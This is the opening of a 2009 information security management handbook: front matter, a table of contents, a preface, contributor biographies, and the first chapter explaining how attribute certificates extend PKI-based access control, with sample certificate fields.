
Information Security
Management Handbook
Sixth Edition
Volume 3

InformatIon SecurIty management handbook
Information Security Management Handbook, Sixth Edition
Edited by Harold F. Tipton, CISSP and Micki Krause, CISSP
Volume 1, 2007, ISBN:  978-0-8493-7495-1
Volume 2, 2008, ISBN:  978-1-4200-6708-8
Volume 3, 2009, ISBN:  978-1-4200-9092-5
Information Security Management Handbook, 2009 CD-ROM Edition
ISBN:  978-1-4200-9098-7
auerbach PublIcatIonS
www.auerbach-publications.com
To Order Call: 1-800-272-7737 • Fax: 1-800-374-3401
E-mail: orders@crcpress.com

Information Security
Management Handbook
Edited by
Harold F. Tipton, CISSP • Micki Krause, CISSP
Sixth Edition
Volume 3

Auerbach Publications
Taylor & Francis Group
6000 Broken Sound Parkway NW, Suite 300
Boca Raton, FL 33487-2742
© 2009 by Taylor & Francis Group, LLC 
Auerbach is an imprint of Taylor & Francis Group, an Informa business
No claim to original U.S. Government works
Printed in the United States of America on acid-free paper
10 9 8 7 6 5 4 3 2 1
International Standard Book Number-13: 978-1-4200-9092-5 (Hardcover)
This book contains information obtained from authentic and highly regarded sources. Reasonable 
efforts have been made to publish reliable data and information, but the author and publisher can-
not assume responsibility for the validity of all materials or the consequences of their use. The 
authors and publishers have attempted to trace the copyright holders of all material reproduced 
in this publication and apologize to copyright holders if permission to publish in this form has not 
been obtained. If any copyright material has not been acknowledged please write and let us know so 
we may rectify in any future reprint.
Except as permitted under U.S. Copyright Law, no part of this book may be reprinted, reproduced, 
transmitted, or utilized in any form by any electronic, mechanical, or other means, now known or 
hereafter invented, including photocopying, microfilming, and recording, or in any information 
storage or retrieval system, without written permission from the publishers.
For permission to photocopy or use material electronically from this work, please access www.copy-
right.com (http://www.copyright.com/) or contact the Copyright Clearance Center, Inc. (CCC), 222 
Rosewood Drive, Danvers, MA 01923, 978-750-8400. CCC is a not-for-profit organization that pro-
vides licenses and registration for a variety of users. For organizations that have been granted a 
photocopy license by the CCC, a separate system of payment has been arranged.
Trademark Notice: Product or corporate names may be trademarks or registered trademarks, and 
are used only for identification and explanation without intent to infringe.
Visit the Taylor & Francis Web site at
http://www.taylorandfrancis.com
and the Auerbach Web site at
http://www.auerbach-publications.com

v
Contents
Preface.............................................................................................................ix
Contributors....................................................................................................xi
1
Domain   Access Control
1	
Expanding PKI-Based Access Control Capabilities with Attribute 
Certificates..............................................................................................3
Alex Golod
2	
Five Components to Identity Management Systems..............................19
Kevin Castellow
3	
Security Weaknesses of System and Application Interfaces Used 
to Process Sensitive Information...........................................................33
Sean M. Price
2
Domain   TELECOMMUNICATIONS AND NETWORK 
SECURITY
4	
Mobile Data Security............................................................................43
George G. McBride
5	
Enhanced Security Through Open Standards: A Path to a 
Stronger Global Digital Ecosystem.......................................................57
David O’Berry
6	
Web Application Firewalls....................................................................73
Georges J. Jahchan
7	
Botnets..................................................................................................77
Robert M. Slade

vi  ◾  Contents
3
Domain   Information Security and Risk 
Management
8	
Collaborating Information Security and Privacy to Create 
Effective Awareness and Training.........................................................89
Rebecca Herold
9	
Security Information and Event Management (SIEM) 
Technology..........................................................................................111
E. Eugene Schultz
10	 The Insider Threat: A View from the Outside......................................127
Todd Fitzgerald
11	
Pod Slurping........................................................................................137
Ben Rothke
12	 The USB (Universal Security Burden) Nightmare: 
Pod Slurping and Other High Storage Capacity Portable 
Device Vulnerabilities.........................................................................145
Kenneth F. Belva
13	 Diary of a Security Assessment: “Put That in Your Pipe and 
Smoke It!”............................................................................................149
Ken M. Shaurette
14	 NERC Compliance: A Compliance Review.........................................163
Bonnie Goins Pilewski and Christopher A. Pilewski
4
Domain   Application Security
15	 Mashup Security..................................................................................189
Mano Paul
16	 Format String Vulnerabilities..............................................................199
Mano Paul
17	 Fast Scanning Worms..........................................................................207
Paul A. Henry
5
Domain   CRYPTOGRAPHY
18	 Message Digests...................................................................................217
Ralph Spencer Poore

Contents  ◾  vii
19	 Quantum Computing: The Rise of the Machine.................................227
Robby Fussell
6
Domain   SECURITY ARCHITECTURE and DESIGN
20	 Information Flow and Covert Channels..............................................239
Sean M. Price
21	 Securing Data at Rest: From Smart Phones to Tapes Defining 
Data at Rest.........................................................................................281
Samuel Chun and Leopold Kahng
7
Domain   OPERATIONS SECURITY
22	 Validating Tape Backups.....................................................................303
Sandy Bacik
8
Domain   BUSINESS CONTINUITY PLANNING AND 
DISASTER RECOVERY PLANNING
23	 Determining Business Unit Priorities in Business Continuity 
Management........................................................................................313
Kevin Henry
24	 Continuity Program Testing, Maintenance, Training, and 
Awareness............................................................................................323
Carl Jackson
9
Domain   LEGAL, REGULATIONS, COMPLIANCE, AND 
INVESTIGATION
25	 Bluesnarfing........................................................................................337
Mano Paul
26	 Virtualization and Digital Investigations...........................................347
Marcus K. Rogers and Sean C. Leshney
1
Domain 0  PHYSICAL SECURITY
27	 Halon Fire Suppression Systems..........................................................367
Chris Hare

viii  ◾  Contents
28	 Crime Prevention through Environmental Design.............................377
Mollie E. Krehnke
29	 Data Center Site Selection and Facility Design Considerations..........393
Sandy Bacik
Index............................................................................................................401

ix
Preface
Lions and Tigers and Bears, Oh My!!
The sky may not be falling but the onslaught of threats from new technologies, soft-
ware vulnerabilities, and disgruntled employees hasn’t vanished. Combating the bad 
and safeguarding information assets continue to be our job and we do it with all the 
ammunition we can muster. Like savvy organizations that protect themselves with 
knowledgeable and able-bodied security professionals, those professionals, in turn, 
arm themselves with the best information, guidance, and counsel they can obtain.
Ergo, the Information Security Management Handbook, which is an anthology of 
treatises dealing with the management and technical facets of information security. 
The Handbook is a virtual coat of armor, shielding the reader with practical and timely 
instruction and implementable recommendations for a more secure environment.
   ISMH
Arm Yourself with Knowledge and Practical
Advice
•Knee-jerk legislation
•Anywhere computing
•Virtualization
•Podslurping
•Quantum computing
•Mashups
•Blue snarfing
•Mobile device theft
•Social computing
• Voting machine in-
security
•Format string
vulnerabilities

x  ◾  Preface
The Handbook is a reference manual that speaks to a broad audience. Our 
readership encompasses information technology executives, operations manag-
ers, system administrators, security professionals, privacy and compliance officers, 
attorneys, forensics investigators, risk managers, and more. As we know from the 
ten domains of the Common Body of Knowledge®, the breadth and depth of the 
profession are enormous.
Moreover, the Handbook possesses the unique attribute of timeliness, even as 
the environment morphs and evolves. Although certain chapters are published in 
multiple editions, it is because they remain relevant.
Security conferences, vendor Webinars, peer networking, and a multitude of 
hard copy and online publications abound. Thank goodness for the wealth of infor-
mation they afford us. It is widely known and accepted that we can’t do our jobs 
in a vacuum.
We’re proud to say that this Handbook is among the best of those information 
resources. It is the exemplary output of professionals and practitioners whose pas-
sion moves them to share solutions with those seeking answers.
As always, we tip our hat to those contributors. And to our readers, we wish 
continued success.
Hal Tipton
Micki Krause

xi
Contributors
Sandy Bacik, CISSP, ISSMP, CISM, CHS-III, has over 12 years direct develop-
ment, implementation, and management information security experience in the 
areas of audit management, disaster recovery/business continuity, incident inves-
tigation, physical security, regulatory compliance, and standard operating policies 
and procedures, and an additional ten years in various information technology 
positions. Throughout her career Sandy has managed, architected, and imple-
mented comprehensive information assurance programs, and managed internal, 
external, and contracted/outsourced information technology audits to ensure vari-
ous regulatory compliance for state and local government entities and Fortune 200 
companies. Sandy has developed methodologies for risk assessments, information 
technology audits, vulnerability assessments, security policy and practice writing, 
incident response, and disaster recovery. Sandy has implemented cross-functional 
business continuity programs and developed an enterprisewide security conscious 
culture through information assurance programs.
Kenneth F. Belva, CISSP, CEH, CISM, is the publisher and editor-in-chief of 
bloginfosec.com. He currently manages an information technology risk manage-
ment program for a bank whose assets are billions of dollars. He reports directly 
to the senior vice president and deputy general manager (CFO). ITsecurity.com 
recognized him as one of the top information security influencers in 2007. He 
is currently on the board of directors for the New York Metro Chapter of the 
Information Systems Security Association (ISSA) and is the chair of the Public 
Relations Committee. In this role, Kenneth is in charge of communication between 
the chapter and other information security–related professional organizations. He 
has spoken and moderated at the United Nations as well as presented on AT&T’s 
Internet Security News Network (ISNN) on discovering unknown Web applica-
tion vulnerabilities and has been interviewed on security enablement.
Kevin Castellow, CISSP, is a senior technical architect specializing in identity 
management and application security. He has over ten years of technical experi-
ence working in multiple disciplines and industries using emerging technologies to 

xii  ◾  Contributors
solve business problems. Kevin started his career in data warehousing and quickly 
recognized the need for better controls for the data and presentation layer. Kevin 
continued his career by shifting focus to access controls and applications develop-
ment. Kevin has held positions as a solutions engineer, systems engineer, systems 
analyst for the U.S. government, and currently as a senior technical architect. He is 
highly skilled in the analysis, design, project management, and implementation of 
enterprise solutions. Throughout Kevin’s career he has stressed the need to develop 
applications and systems that are secured by design.
Samuel Chun, CISSP, is an enterprise consultant for information security at 
Electronic Data Systems (EDS). He has authored chapters in three previous editions 
of the Information Security Management Handbook and his contributions can also be 
found in journals such as Homeland Defense Journal and Government Security News.
Todd Fitzgerald, CISSP, CISA, CISM, is the director of systems security and sys-
tems security officer for United Government Services, LLC, which is the largest 
processor of Medicare hospital claims on behalf of the Centers for Medicare and 
Medicaid Services (CMS) and is a subsidiary of WellPoint, Inc., the nation’s larg-
est health insurer. He has over 25 years of broad-based information technology 
experience, holding senior IT management positions with Fortune 500 and Global 
Fortune 250 companies. Todd is a member of the board of directors and security 
taskforce co-chair for the HIPAA Collaborative of Wisconsin (HIPAA COW), a 
participant in the CMS/Gartner Security Best Practices Group, Blue Cross Blue 
Shield Association Information Security Advisory Group, previous board member 
for several Information Systems Security Associations (ISSA), and is a frequent 
speaker and writer on security issues. Todd focuses largely on issues related to 
security management, risk assessments, policy development, organizing security, 
security assessments, regulatory compliance (HIPAA, CAST, NIST, ISO 17799), 
security awareness, and developing security programs.
Robby Fussell, CISSP, NSA IAM, GSEC, is an information security/assurance 
manager for a government contracting company. Robby is currently performing 
academic research in the area of preventing cascading failures in scale-free net-
works using artificial intelligence techniques.
Bonnie Goins Pilewski, BS7799 Lead Auditor, CISSP, NSA IAM, GIAC, CISM, 
ISS, ITIL Foundations Certified Professional, PCI QSA, is a nationally recognized 
subject matter expert in information security management. Her security and busi-
ness expertise have been put to use by many organizations to enhance or to develop 
world-class operations. With over 17 years of experience in management consulting, 
information technology, and security, Bonnie is chosen by executive management 
for her depth of knowledge and experience in information technology and secu-
rity strategy development and refinement; risk and security assessment methods; 

Contributors  ◾  xiii
security program design, development, and implementation; regulatory compliance 
initiatives, such as HIPAA, Sarbanes–Oxley, PCI, GLBA, NERC/FERC, FISMA, 
and others; policy, procedure, and plan creation; technology and business process 
reengineering; secure network infrastructure design and implementation; business 
continuity and incident response initiatives; application security methods; and 
security/technology/regulatory training.
Alex Golod, CISSP, is a senior infrastructure specialist for a security architecture 
and engineering organization within a Fortune 100 IT service firm. With more 
than 11 years of consulting, designing, and implementation in the IT security 
industry, he has also contributed to several publications.
Chris Hare, CISSP/CISA/CISM, has over 20 years of experience in the computing 
industry with key positions ranging from application design, quality assurance, sys-
tem administration/engineering, network analysis, and security consulting, opera-
tions, architecture and audit. Chris is the co-author of New Riders Publishing’s 
Inside Unix, Internet Firewalls and Network Security, Building an Internet Server 
with Linux, and The Internet Security Professional Reference. His book credits also 
include the Official (ISC)2 Guide to the CISSP Exam from Auerbach Press. He has 
eared an M.A., specializing in adult education, and is accredited with the Certified 
information Systems Security Professional (CISSP), the Certified Information 
Systems Auditor (CISA), and the Certified Information Security Manager (CISM) 
designations. He is currently employed with a major telecommunications carrier 
with an emphasis on security reviews and training.
Kevin Henry, CISSP-ISSAP, ISSEP, ISSMP, CAP, SSCP, CISA, CISM, is the 
vice president of ITPG, responsible for all educational systems, products, and 
instructors for training programs for their major clients such as BCI, IEEE, and 
SCIPP International, and is the exclusive training provider for the International 
Information Systems Security Certification Consortium (ISC)2. Kevin manages all 
courseware development efforts, instructor development, and textbook projects for 
ITPG. He has been involved in computers since 1976 when he was an operator on 
the largest minicomputer system in Canada at the time. He has since worked in 
many areas of information technology including computer programming, systems 
analysis, and information technology audit. Following 20 years in the telecommu-
nications field, Kevin moved to a senior auditor position with the state of Oregon, 
where he was a member of the Governor’s IT Security Subcommittee and per-
formed audits on courts and court-related IT systems.
Paul A. Henry, MCP+I, MCSE, CCSA, CCSE, CFSA, CFSO, CISSP-ISSAP, 
CISM, CISA, CIFI, is one of the world’s foremost global information security 
experts, with more than 20 years experience managing security initiatives for 
Global 2000 enterprises and government organizations worldwide. Throughout his 

xiv  ◾  Contributors
career, Paul has played a key strategic role in launching new products and retooling 
existing product lines. He also advises and consults on some of the world’s most 
challenging and high-risk information security projects, including the National 
Banking System in Saudi Arabia, the U.S. Department of Defense’s Satellite 
Data Project, and both government and telecommunications projects throughout 
Southeast Asia. Paul is frequently cited by major and trade print publications as an 
expert on both technical security topics and general security trends, and serves as 
an expert commentator for network broadcast outlets such as FOX, NBC, CNN, 
and CNBC.
Rebecca Herold, CIPP, CISSP, CISM, CISA, FLMI, is an information privacy, 
security, and compliance consultant, author, and instructor who has provided assis-
tance, advice, services, tools, and products to organizations in a wide range of indus-
tries throughout the world for over 17 years. In October 2007, Rebecca was named 
one of the “Best Privacy Advisers” in two of three categories by Computerworld 
magazine. Rebecca was also named one of the “Top 59 Influencers in IT Security” 
for 2007 by IT Security magazine. Rebecca assists organizations of all sizes and 
industries throughout the world with their information privacy, security and regu-
latory compliance programs, content development, and strategy development and 
implementation. She offers a range of standard and customized one- and two-day 
workshops including one addressing how individuals across disciplines can work 
together to assure privacy and regulatory compliance most effectively while effi-
ciently implementing security controls.
Carl Jackson, CISSP, CBCP, is business continuity program director with Pacific 
Life Insurance. He has more than 25 years of experience in the areas of continuity 
planning, information security, and information technology internal control, and 
quality assurance reviews and audits. Prior to joining Pacific Life, he worked with 
several information security consulting companies and as a Partner with Ernst & 
Young, where he was the firm’s BCP service line leader. Carl has extensive consult-
ing experience with numerous major organizations in multiple industries, including 
manufacturing, financial services, transportation, health care, technology, pharma-
ceutical, retail, aerospace, insurance, and professional sports management. He also 
has extensive industry business information security experience as an information 
security practitioner and manager in the field of information security and business 
continuity planning. He has written extensively and is a frequent public speaker on 
all aspects of information security and business continuity planning.
Georges J. Jahchan, CISA, CISM, BS7799 Lead Auditor, has been in various 
personal computer-related positions for over 25 years, including six years address-
ing gateway security, three years as a security officer in a university, and currently 
working as a senior network and voice management and security management con-
sultant in Levant, Egypt, and North Africa with Computer Associates.

Contributors  ◾  xv
Leopold Kahng is a consulting systems engineer working on federal strategic pro-
grams at Cisco Systems, Inc. In his current position, Leo serves as Cisco’s lead tech-
nical point of contact to drive architecture standards for the Secure Information 
Sharing Architecture (SISA) program. He is a senior technical consultant with over 
12 years of progressive technology industry experience in architecture design and 
implementation, including over six years experience in U.S. federal government 
sales. His expertise is in IP telephony, telecommunications, data networking, rich-
media conferencing (audio, video, and Web), and customer contact centers. Leo 
joined Cisco as a voice systems engineer in enterprise commercial sales in 1999.
Mollie E. Krehnke, CISSP, CHS-II, IAM, is a senior information security consul-
tant in Raleigh, North Carolina. She and her husband, David Krehnke, are mem-
bers of the inventor team for the Workstation Lock and Alarm System (U.S. Patent 
Number 6,014,746). She has served as an information security consultant for 20 years 
in assessment and implementation of information security technologies, policy, prac-
tices, procedures, and protection mechanisms in support of organizational objectives 
for various federal agencies, government contractors, and private organizations.
Sean C. Leshney is a senior graduate student in the Cyber Forensics Program at 
Purdue University. He is also the Law Enforcement Training Coordinator providing 
operational digital forensic support to local, state, and federal law enforcement 
agencies. In addition, Sean helps design and teaches digital forensics courses in the 
Department of Computer and Information Technology at Purdue University. A 
former police officer in Indiana, Sean was a Special Agent for the Office of Inspector 
General for the State of Indiana and provided digital forensics support for its inves-
tigations. He also served in the U.S. Navy as an electronics technician for several 
years. His research interests include virtual machines and applied cyber-forensics.
George G. McBride, CISSP, CISM, is a senior manager in the Enterprise Risk 
Services group at Deloitte & Touche, LLP. Based out of Princeton, New Jersey, 
George has worked in the risk management and the network security industries 
for more than 14 years. Prior to Deloitte & Touche, LLP, George was with Aon 
and with Lucent Technologies. George has spoken at conferences worldwide on 
topics such as penetration testing, risk assessments, and open source security tools. 
He has consulted to numerous Fortune 100 companies on projects including net-
work architecture, application vulnerability assessments, and security organization 
and program development. George has contributed to The Black Book on Corporate 
Security, has hosted several Webcasts, and has contributed to several previous edi-
tions of the Information Security Management Handbook.
David O’Berry, CISSP-ISSAP, ISSMP, MCNE, CNE-I, CSPM, is director of 
information technology systems and services for the South Carolina Department 
of Probation, Parole, and Pardon Services (SCDPPPS). He and his team have 

xvi  ◾  Contributors
developed an SOA-based Offender Management System (OMS), which is evolv-
ing to take various streams of data such as GPS monitoring technology to bet-
ter manage the life cycle of offenders and to enhance the organization’s overall 
effectiveness in providing services to the community. Prior to joining SCDPPPS, 
O’Berry served as network manager at the Department of Juvenile Justice. During 
the past year, he has co-led the effort to adopt a statewide security policy, achieving 
that goal with a unanimous vote in December 2007 while substantially progress-
ing the initiative to establish comprehensive baseline security standards for South 
Carolina agencies.
Manoranjan (Mano) Paul, CSSLP, CISSP, AMBCI, MCAD, MCSD, Network+, 
ECSA is CEO and president of Express Certifications and SecuRisk Solutions, 
companies specializing in professional training, certification, security products, 
and security consulting. Mano started his career as a shark researcher in the 
Bimini Biological Field Station, Bahamas. His educational pursuit took him to 
the University of Oklahoma where he received his Business Administration degree 
in management information systems (MIS) with valedictory accolades. Before 
Express Certifications and SecuRisk Solutions, Mano played several roles as soft-
ware developer, quality assurance tester, logistics manager, technical architect, IT 
strategist and security engineer, program manager and IT strategist at Dell, Inc. 
His security experience includes designing and developing software security pro-
grams from Compliance-to-Coding, application security risk management, secu-
rity strategy and management, conducting security awareness sessions, training, 
and other educational activities. He writes periodically for certification, software 
development, and security magazines and has contributed to several security topics 
for the Microsoft Solutions Developer Network. He has been featured at various 
domestic and international security conferences and is an invited speaker and pan-
elist at the CSI (Computer Security Institute), Catalyst (Burton Group), TRISC 
(Texas Regional Infrastructure Security Conference), SC World Congress, and 
the OWASP (Open Web Application Security Project) application security confer-
ences. In addition to his MIS degree, Mano holds a bachelor of science degree from 
the University of Chennai, India, and a diploma in import export management 
from the Indian Institute of Export Management.
Christopher A. Pilewski, CISSP, BS 7799 Lead Auditor, NSA IAM/IEM, CCSA, 
GIAC, CPA/E, FSWCE, FSLCE, MCP, is a senior consultant for Ajilon, the 
international consulting and professional services firm. He has over 16 years of 
professional experience in consulting, audit, security, networking technology, and 
engineering. This experience spans compliance, audit, security, risk assessment 
and mitigation, business process, technical controls, business continuity, technical 
project leadership, design, and integration of network and information systems. 
Before joining Ajilon, he worked for consulting and audit firms, as well as flagship 
communications companies, where he led a wide variety of projects ranging from 

Contributors  ◾  xvii
compliance efforts (Sarbanes­-Oxley, HIPAA, VISA CISP, and others), audits, secu-
rity assessments, implementation of security systems, secure network architecture, 
network management systems, quality control/assurance, protocol analysis, and 
technical marketing.
Ralph Spencer Poore, CFE, CISA, CISSP, CHS-III, CTGA, QSA, is the chief 
cryptologist for Cryptographic Assurance Services LLC. He has over 35 years 
experience in the information security field. Ralph has a BA (psychology) and an 
MA (liberal arts) from Texas Christian University. He has taught college, gradu-
ate school, USAF, and commercial courses, developed ISO and X9 security stan-
dards (including chairing various X9 standards working groups), and was one of 
the early presidents of the International Information Systems Security Certification 
Consortium [(ISC)²].
Sean M. Price, CISA, CISSP, is an independent security researcher and consultant 
living in northern Virginia. He specializes in designing and evaluating organiza-
tional information assurance programs and system security architectures. Research 
interests include insider threat, information flows, and applications of artificial 
intelligence to information assurance problems. Prior publications include contribu-
tions to the Information Security Management Handbook, Official (ISC)2 Guide to the 
CISSP CBK, IEEE Computer magazine, as well as other journals and conferences.
Marcus K. Rogers, PhD, CISSP, CCCI, is the chair of the Cyber-Forensics 
Program in the Department of Computer and Information Technology at Purdue 
University. He is a professor, university faculty scholar, and a research faculty 
member at the Center for Education and Research in Information Assurance and 
Security (CERIAS). Marc was a senior instructor for (ISC)2, the international body 
that certifies information system security professionals (CISSP); is a member of 
the quality assurance board for (ISC)2’s SCCP designation; and is international 
chair of the Law, Compliance, and Investigation Domain of the Common Body of 
Knowledge Committee. He is a former police detective who worked in the area of 
fraud and computer crime investigations. Marc is the editor-in-chief of the Journal 
of Digital Forensics Practice, sits on the editorial board for several professional jour-
nals, and is a member of various national and international committees focusing on 
digital forensic science and digital evidence. His research interests include applied 
cyber-forensics, psychological digital crime scene analysis, and cyber-terrorism.
Ben Rothke, CISSP, CISM, PCI QSA, is a New York City-based senior security 
consultant with BT Professional Services and has over 15 years of industry experi-
ence in information systems security and privacy. His areas of expertise are in risk 
management and mitigation, security and privacy regulatory issues, design and 
implementation of systems security, encryption, cryptography, and security policy 
development. Prior to joining BT, Ben was with AXA, Baltimore Technologies, 

xviii  ◾  Contributors
Ernst & Young, and Citicorp, and has provided security solutions to many Fortune 
500 companies. Ben is the author of Computer Security: 20 Things Every Employee 
Should Know (McGraw-Hill), and a contributing author to Network Security: The 
Complete Reference (Osborne) and the Information Security Management Handbook 
(Auerbach). He writes a monthly security book review for Security Management 
and is a former columnist for Information Security, UNIX Review, and Solutions 
Integrator magazines. Ben is also a frequent speaker at industry conferences such as 
CSI, RSA, MISTI and NetSec, and is a member of ASIS, CSI, and InfraGard.
E. Eugene Schultz, PhD, CISM, CISSP, is the chief technology officer at Emagined 
Security, an information security consultancy based in San Carlos, California. He is 
the author/co-author of five books on the subjects of Unix security, Internet security, 
Windows NT/2000 security, incident response, with the latest on intrusion detec-
tion and prevention. He has also written over 120 published papers. Gene was the 
editor-in-chief of Computers and Security from 2002 through 2007, and is currently 
on the editorial board for this journal. He is an associate editor of Network Security, 
and is an editor of the SANS NewsBites. He is also a SANS instructor, a member of 
the accreditation board of the Institute of Information Security Professionals (IISP), 
and is on the technical advisory board of three companies. Gene has previously 
managed an information security practice as well as a national incident response 
team that he founded in 1989. He has been professor of computer science at several 
universities and is retired from the University of California at Berkeley.
Ken M. Shaurette, CISSP, CISA, CISM, an information technology professional 
since 1979 who has worked at all levels of information technology, has a proven 
ability for managing, recruiting, and mentoring professionals using excellent com-
munication, a proven ability for problem solving, and a demonstrated commit-
ment to customer satisfaction to build strong business relationships. He provides 
experience in the practical application of multiple industry-accepted security 
methodologies, standards, and guidelines. He is a trusted industry advisor who 
has a strong understanding of complex computing environments and the appro-
priate solutions to provide efficient, secure operations that comply with legislative 
and regulatory requirements. Ken is a founding member and past president of the 
Western Wisconsin Chapter of InfraGard, a past president and vice president of 
ISSA–Milwaukee Chapter, and current president and a founding member of ISSA–
Madison Chapter.
Robert M. Slade, CISSP, is an information security and management consultant 
from North Vancouver, British Columbia, Canada. Initial research into computer 
viral programs developed into the writing and reviewing of security books, and even-
tually into conducting review seminars for CISSP candidates. He also promotes the 
Community Security Education project, attempting to promote security awareness 
for the general public as a means of reducing overall information security threats.

1
Access Control


3
1
Chapter 
Expanding PKI-Based 
Access Control 
Capabilities with 
Attribute Certificates
Alex Golod
1.1  Introduction
After passing through several cycles of hype, public key certificates (PKC) technol-
ogy is now in the mature phase. Moreover, thanks to open source developments 
and the enhancement of OS-integrated certificate authorities (CA), along with 
crypto providers, related software development kits, and runtime environments, 
Contents
1.1	 Introduction..................................................................................................3
1.2	 AC Applications............................................................................................4
1.3	 Use Case.......................................................................................................5
1.4	 PKC and AC.................................................................................................6
1.5	 PMI and PKI..............................................................................................13
1.6	 AC Validation.............................................................................................15
1.7	 Putting It All Together................................................................................16
1.8	 Conclusions.................................................................................................17
References............................................................................................................18

4  ◾  Information Security Management Handbook
public key certificate services and infrastructures (PKI) are now easier and less 
expensive to implement.
This creates an opportunity to extend further and enhance PKC-based applica-
tions, access control, and permission management systems in a cost-effective way. 
Many of the PKCs relying on access controls for VPN, Web services secure com-
munications, secure messaging, etc., have used X509 certificates both for authen-
tication and for authorization or permission control. In many cases, a successful 
authentication with PKC only implies authorization for connection or data trans-
mission. In cases where an explicit permission control is required, this control can 
be part of an integrated or embedded permission management system. This chapter 
analyzes one particular way of managing permission control via attribute certifi-
cates (AC).
1.2  AC Applications
Although AC may be used by different applications wherever any assertions about a 
subject are required, this chapter focuses on access control applications. A PKI-based 
access control first authenticates a PKC holder. If no AC is provided, the access con-
trol system would process a client PKC by parsing it and mapping its subject name 
and attributes into its permission management and provisioning back-end data store, 
which has groups, membership, and permission and privilege control information. 
For example, an application may request that the only clients to be allowed access 
to a resource are to be those that are legitimate holders of a trusted CA’s X509.v3 
certificate of which the extension subjectAltName belongs to a domain “exchange.
com,” and of which the role attribute has a value “auditor.” Changes to the public 
key certificate for adding or modifying attributes or extensions are not easy and 
would require the reissue of the whole PKC. It would lead to redistributing and 
maintaining multiple certificates for one subject, which is not practical.
At the same time that PKI and X509 PKC-relying applications started get-
ting more popular, a slightly different type of X509 certificate—the AC—was 
introduced. These certificates do not contain the certificate holder’s public key, but 
rather attributes that may be useful in many applications, especially in applications 
that rely on group membership, privileges, role-based access control (RBAC), and 
many others. In Figure 1.1, you can see the relationship between PKC and AC: 
“Holder” of the AC is bound to the “Issuer DN” and “Certificate Serial Number” 
of the PKC.
Now, before looking at the use case in Section 1.3, let us turn to an analogy that 
clarifies the relation between AC and PKC [RFC3281]. This relation is similar to 
one between a passport and a visa. A passport identifies its holder and is issued by 
a passport authority in a country where a subject resides. When that subject needs 
to travel to a place that requires an entry visa, he or she turns to another authority, 
which represents the destination of the travel, and that authority issues the visa. The 

Expanding PKI-Based Access Control Capabilities  ◾  5
visa is bound to the passport data and usually has a shorter life span. The passport 
holder can have multiple visas issued by different authorities, but all of them are 
bound to one passport. Likewise, many ACs may relate to one PKC. The PKC is for 
authentication and the AC is for roles and privileges.
Just as PKC presents a way to manage and distribute a subject’s public keys 
securely, bound to the subject identity, an AC is a way to do the same to the sub-
ject’s privilege attributes and other attributes. Both for PKC and AC, a signature of 
a trusted designated authority is required to endorse these “bindings” and guaran-
tee their integrity. Thus for PKC it is a signature of PKI/CA and for AC it may be an 
attribute authority (AA) operating in the Permission Management Infrastructure 
(PMI). AA essentially delegates permissions or privileges to the holder of the AC 
it issues.
Some of the first and most well-known applications with AC are European 
projects SESAME [SESAME] and PERMIS [PERMIS]. The project PERMIS was 
challenged to build a role-based PMI that could be used for different applications. 
That PMI supports the RBAC system and includes two fundamental parts: the 
privilege allocation subsystem and the privilege verification subsystem.
Similar components can be identified in other applications that require permis-
sion management, especially those that rely on AC.
1.3  Use Case
In systems built on the “hub and spoke” model, permission control can be com-
plicated. Table 1.1 shows a network that includes a central site (hub) and several 
satellites (spokes). Clients on one site have certain privileges for accessing services 
and resources on their own site, on other spoke sites, or on the central hub. The sites 
Version
Certiﬁcate Serial Number
Signature Algorithm ID
Issuer DN
Vadility Period
Subject DN
Subject Public Key Info
Issuer Unique ID
Subject Unique ID
Extensions
Signature
Version
Holder
Issuer DN
Signature Algorithm ID
Certiﬁcate Serial Number
Vadility Period
Attribute
Issuer Unique ID
Extensions
Signature
Public Key Certiﬁcate
Attribute Certiﬁcate
Figure 1.1  PKC and AC.

6  ◾  Information Security Management Handbook
and resources on those sites are also assigned different security levels (based on their 
data classification). RBAC and mandatory access control should be implemented 
according to the policies. Implementing and supporting these models may require 
multiple interrelated access control matrixes for each site, which are not easy to 
maintain in a timely manner. Each site hosts its main project, but the participants 
and resources of each project can be used in other projects hosted on other sites. 
These relationships are presented in Table 1.1.
Only one authorized (designated) client from each site can access required 
resources (objects) on another site with one predefined privilege: as a contributor 
(authorized to do modifications) or as a viewer (authorized to read and copy). To 
implement this permission control, the privileged clients will be issued appropriate 
ACs by the authorities on the sites to which they need access (Table 1.2).
In the example shown in Figure 1.2, each client on one site may have not more 
than one AC for accessing an object on another site. In a larger AC-based PMI, 
some or all the clients may be assigned multiple ACs. The combination of attributes 
in the clients’ ACs or the combination of ACs belonging to one client creates per-
mission control conditions for the access control system on each site. The business 
model may or may not require that the PMI for each site should be controlled by 
that site. Thus each site has its own AA.
1.4  PKC and AC
The main difference between PKC and AC is that the former binds identity and a 
public key, and the latter binds the subject and its attributes. Although PKC may 
Table 1.1  A Network That Includes a Central Site (Hub) and Several 
Satellites (Spokes)
Site 
(Project) 
Resources and 
Users (Clients) on 
Site
Resources Required 
for This Project 
but Located on 
Another Site
Shared Resources of 
the Project
A
Object A1, Object 
A2, Client A1, Client 
A2, Client A3
Object B2, Object 
C3
Object A2
B
Object B1, Object 
B2, Client B1, Client 
B2, Client B3
Object A2, Object 
C1
Object B2
C
Object C1, Object 
C2, Object C3, 
Client C1, Client C2
Object A2, Object 
B2
Object C3, Object 
C1

Expanding PKI-Based Access Control Capabilities  ◾  7
Table 1.2  To Implement This Permission Control, the Privileged Clients Will Be Issued Appropriate ACs by the 
Authorities on the Sites To Which They Need Access
Attribute Authority A
Attribute Authority B
Attribute Authority C
AC Issued to
Client B1
Client C1
Client A1
Subject’s PKC
SubjectDN: cn=clientB1, 
ou=departmentB, o=acme, 
dc=com;
IssuerDN: cn=acmeCA, o=acme, 
c=us;
serialNumber: 10203040506070
SubjectDN: cn=clientC1, 
ou=departmentC, o=acme, 
dc=com;
IssuerDN: cn=acmeCA, o=acme, 
c=us;
serialNumber: 11213141516171
SubjectDN: cn=clientA1, 
ou=departmentA, o=acme, 
dc=com;
IssuerDN: cn=acmeCA, o=acme, 
c=us;
serialNumber: 12223242526272
Subject’s AC
Holder: IssuerDN: cn=acmeCA, 
o=acme, c=us + 
serialNumber=10203040506070;
Attribute Type=siteA-Role 
Attribute Value=contributor;
Extension=AC Targeting
ExtensionValue=ObjectA2;
Holder: IssuerDN: cn=acmeCA, 
o=acme, c=us + 
serialNumber=11213141516171;
Attribute Type=siteB-Role 
Attribute Value=contributor;
Extension=AC Targeting
ExtensionValue=ObjectB2;
Holder: IssuerDN: cn=acmeCA, 
o=acme, c=us + 
serialNumber=12223242526272;
Attribute Type=siteC-Role 
Attribute Value=viewer;
Extension=AC Targeting
